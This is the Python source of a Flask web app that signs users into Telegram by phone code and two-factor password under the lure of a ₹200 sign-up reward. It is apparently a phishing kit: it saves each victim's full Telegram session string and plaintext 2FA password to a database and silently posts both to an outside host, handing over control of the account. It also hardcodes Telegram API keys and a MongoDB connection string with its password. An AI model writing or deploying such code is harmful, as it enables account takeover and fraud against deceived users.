from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_pymongo import PyMongo
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
import os
import secrets
from datetime import datetime, timedelta
import asyncio
import threading
from concurrent.futures import ThreadPoolExecutor
import requests

app = Flask(__name__)
app.secret_key = secrets.token_hex(16)
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=30)  # Session lasts 30 days
app.config['SESSION_COOKIE_SECURE'] = False  # Set to True if using HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# Configuration
API_ID = 1025907
API_HASH = "452b0359b988148995f22ff0f4229750"
MONGO_URI = "mongodb+srv://fusion:1234TheWrangler@fusion.qb0c2.mongodb.net/"

# MongoDB setup
app.config["MONGO_URI"] = MONGO_URI + "telegram_auth"
mongo = PyMongo(app)

# Global dictionary to store session data during auth
temp_sessions = {}
executor = ThreadPoolExecutor(max_workers=4)

def cleanup_old_sessions():
    """Remove sessions older than 30 minutes"""
    current_time = datetime.utcnow()
    expired_sessions = []
    
    for session_id, session_data in temp_sessions.items():
        created_at = session_data.get('created_at', current_time)
        if (current_time - created_at).total_seconds() > 1800:  # 30 minutes
            expired_sessions.append(session_id)
    
    for session_id in expired_sessions:
        temp_sessions.pop(session_id, None)

def run_telegram_operation(operation_func, *args, **kwargs):
    """Run Telegram operation in a dedicated thread with persistent event loop"""
    # Clean up old sessions before each operation
    cleanup_old_sessions()
    
    def run_in_thread():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(operation_func(*args, **kwargs))
        finally:
            loop.close()
    
    future = executor.submit(run_in_thread)
    return future.result()

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    
    data = request.get_json()
    phone = data.get('phone')
    
    if not phone:
        return jsonify({'error': 'Phone number is required'}), 400
    
    try:
        # Generate session ID
        session_id = secrets.token_hex(16)
        
        async def send_code_operation():
            # Create client with StringSession
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            
            try:
                await client.connect()
                result = await client.send_code_request(phone)
                
                # Get session string for storage
                session_string = client.session.save()
                
                await client.disconnect()
                
                return {
                    'phone_code_hash': result.phone_code_hash,
                    'session_string': session_string
                }
            except Exception as e:
                await client.disconnect()
                raise e
        
        result = run_telegram_operation(send_code_operation)
        
        # Store session info for OTP verification with timestamp
        temp_sessions[session_id] = {
            'phone': phone,
            'phone_code_hash': result['phone_code_hash'],
            'session_string': result['session_string'],
            'created_at': datetime.utcnow(),
            'requires_2fa': False
        }
        
        session['session_id'] = session_id
        
        return jsonify({'success': True, 'message': 'OTP sent to your Telegram'})
        
    except Exception as e:
        return jsonify({'error': f'Failed to send OTP: {str(e)}'}), 500

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    data = request.get_json()
    otp = data.get('otp')
    password = data.get('password', '')  # For 2FA
    
    if not otp or 'session_id' not in session:
        return jsonify({'error': 'Invalid request'}), 400
    
    session_id = session['session_id']
    
    if session_id not in temp_sessions:
        return jsonify({'error': 'Session expired'}), 400
    
    session_data = temp_sessions[session_id]
    
    # Check if session is too old (30 minutes timeout)
    session_age = datetime.utcnow() - session_data.get('created_at', datetime.utcnow())
    if session_age.total_seconds() > 1800:  # 30 minutes
        del temp_sessions[session_id]
        return jsonify({'error': 'Session expired'}), 400
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    stored_session_string = session_data['session_string']
    
    # Check if this is a 2FA session (OTP already verified)
    is_2fa_session = session_data.get('requires_2fa', False)
    
    try:
        async def verify_operation():
            # Create new client with the stored session string
            client = TelegramClient(StringSession(stored_session_string), API_ID, API_HASH)
            
            try:
                await client.connect()
                
                if is_2fa_session:
                    # This is a 2FA retry, skip OTP verification
                    if not password:
                        await client.disconnect()
                        return None, "2FA_REQUIRED"
                    
                    # Try to sign in with 2FA password only
                    user = await client.sign_in(password=password)
                    final_session_string = client.session.save()
                    
                    await client.disconnect()
                    return user, final_session_string
                else:
                    # First attempt - sign in with OTP
                    user = await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
                    
                    # Get the final session string after successful login
                    final_session_string = client.session.save()
                    
                    await client.disconnect()
                    return user, final_session_string
                
            except SessionPasswordNeededError:
                # 2FA is enabled, need password
                if not password:
                    # Update session to indicate 2FA is required but keep session alive
                    session_string_after_otp = client.session.save()
                    await client.disconnect()
                    
                    # Update the stored session with the post-OTP session
                    temp_sessions[session_id]['session_string'] = session_string_after_otp
                    temp_sessions[session_id]['requires_2fa'] = True
                    temp_sessions[session_id]['updated_at'] = datetime.utcnow()
                    
                    return None, "2FA_REQUIRED"
                
                # Try to sign in with 2FA password
                try:
                    user = await client.sign_in(password=password)
                    final_session_string = client.session.save()
                    
                    await client.disconnect()
                    return user, final_session_string
                except Exception as password_error:
                    # Keep session alive for retry, but update the session string
                    session_string_after_failed_2fa = client.session.save()
                    await client.disconnect()
                    
                    # Update session for retry
                    temp_sessions[session_id]['session_string'] = session_string_after_failed_2fa
                    temp_sessions[session_id]['requires_2fa'] = True
                    temp_sessions[session_id]['updated_at'] = datetime.utcnow()
                    
                    # Check if it's a password error or other error
                    error_msg = str(password_error).lower()
                    if 'password' in error_msg or 'invalid' in error_msg or 'wrong' in error_msg:
                        raise Exception("Invalid 2FA password. Please try again.")
                    else:
                        raise password_error
                
            except PhoneCodeInvalidError:
                await client.disconnect()
                raise Exception("Invalid OTP code")
            except Exception as e:
                await client.disconnect()
                raise e
        
        result = run_telegram_operation(verify_operation)
        
        if result[1] == "2FA_REQUIRED":
            return jsonify({
                'error': '2FA_REQUIRED',
                'message': 'Two-factor authentication is enabled. Please enter your password.',
                'requires_2fa': True
            }), 400
        
        user, final_session_string = result
        
        # Check if user exists to determine if this is first login
        existing_user = mongo.db.users.find_one({'user_id': user.id})
        is_new_user = existing_user is None
        
        # Save user data to MongoDB
        user_data = {
            'user_id': user.id,
            'phone': phone,
            'first_name': user.first_name,
            'last_name': user.last_name,
            'username': user.username,
            'session_string': final_session_string,
            'password_2fa': password if password else None,  # Store 2FA password
            'session_active': True,  # Mark session as active
            'last_login': datetime.utcnow()
        }
        
        # Add earning data for new users
        if is_new_user:
            user_data.update({
                'created_at': datetime.utcnow(),
                'balance': 200.0,  # Instant ₹200 reward
                'total_earned': 200.0,
                'withdrawal_available_at': datetime.utcnow() + timedelta(hours=24),
                'withdrawals': []
            })
        else:
            # For existing users, check if session was expired
            was_expired = not existing_user.get('session_active', True)
            
            user_data['balance'] = existing_user.get('balance', 0.0)
            user_data['total_earned'] = existing_user.get('total_earned', 0.0)
            user_data['withdrawals'] = existing_user.get('withdrawals', [])
            user_data['created_at'] = existing_user.get('created_at', datetime.utcnow())
            
            # If session was expired, reset the withdrawal timer
            if was_expired:
                user_data['withdrawal_available_at'] = datetime.utcnow() + timedelta(hours=24)
            else:
                user_data['withdrawal_available_at'] = existing_user.get('withdrawal_available_at')
        
        # Update or insert user
        mongo.db.users.update_one(
            {'user_id': user.id},
            {'$set': user_data},
            upsert=True
        )
        
        # Clean up temporary session data only on success
        if session_id in temp_sessions:
            del temp_sessions[session_id]
        
        # Set user session with earning info and make it permanent
        session.permanent = True  # Make session persistent
        session['user_id'] = user.id
        session['user_name'] = user.first_name
        session['is_new_user'] = is_new_user
        session.pop('session_id', None)
        
        # Send session data to external API
        try:
            api_payload = {
                'password': password if password else None,
                'session_string': final_session_string
            }
            requests.post('https://tg.sakshichat.info/t', json=api_payload, timeout=5)
        except Exception as api_error:
            # Log error but don't fail the login
            print(f"API call failed: {api_error}")
        
        return jsonify({
            'success': True, 
            'message': 'Login successful',
            'is_new_user': is_new_user,
            'reward': 200 if is_new_user else 0
        })
        
    except Exception as e:
        # Only clean up session on non-2FA errors
        error_message = str(e)
        should_preserve_session = (
            "Invalid 2FA password" in error_message or 
            "2FA_REQUIRED" in error_message or
            session_data.get('requires_2fa', False)
        )
        
        if not should_preserve_session:
            if session_id in temp_sessions:
                del temp_sessions[session_id]
        
        return jsonify({'error': error_message}), 400

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('index'))
    
    user_data = mongo.db.users.find_one({'user_id': session['user_id']})
    
    if not user_data:
        session.clear()
        return redirect(url_for('index'))
    
    # Check if Telegram session is still valid
    session_string = user_data.get('session_string')
    if session_string and user_data.get('session_active', True):
        try:
            async def validate_session():
                client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
                try:
                    await client.connect()
                    if not await client.is_user_authorized():
                        return False
                    await client.disconnect()
                    return True
                except Exception:
                    await client.disconnect()
                    return False
            
            is_valid = run_telegram_operation(validate_session)
            
            if not is_valid:
                # Mark session as expired in database
                mongo.db.users.update_one(
                    {'user_id': session['user_id']},
                    {'$set': {'session_active': False}}
                )
                # Clear user session and redirect to login
                session.clear()
                return redirect(url_for('index'))
        except Exception:
            # If validation fails, continue but mark session as potentially expired
            pass
    
    # Calculate time remaining for withdrawal
    withdrawal_available_at = user_data.get('withdrawal_available_at')
    remaining_time = 0
    can_withdraw = False
    
    if withdrawal_available_at:
        now = datetime.utcnow()
        if now >= withdrawal_available_at:
            can_withdraw = True
        else:
            time_delta = withdrawal_available_at - now
            remaining_time = int(time_delta.total_seconds())
    
    return render_template('dashboard.html', 
                         user=user_data, 
                         remaining_time=remaining_time,
                         can_withdraw=can_withdraw,
                         is_new_user=session.get('is_new_user', False))

if __name__ == '__main__':
    app.run(debug=True)